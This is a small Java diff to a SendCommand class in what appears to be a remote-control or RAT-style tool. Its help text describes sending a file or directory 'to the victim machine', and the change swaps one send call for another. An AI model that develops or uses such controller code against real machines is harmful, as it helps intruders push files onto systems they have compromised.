@@ -11,7 +11,7 @@ public class SendCommand extends Command{
 	private String _command;
 	
 	public SendCommand() {
-		super("send", "\"file/directory\"", "sends the specified file/directory to the victim's machine");
+		super("send", "\"file/directory\"", "sends the specified file/directory to the victim machine");
 	}
 
 	protected boolean parse(String command) {
@@ -31,7 +31,7 @@ public class SendCommand extends Command{
 		File fileToSend = new File(_fileName);
 		
 		if(fileToSend.exists()) {
-			con.send(_command);
+			con.simpleSend(_command);
 			server.sendFile(fileToSend);
 		}
 		else {
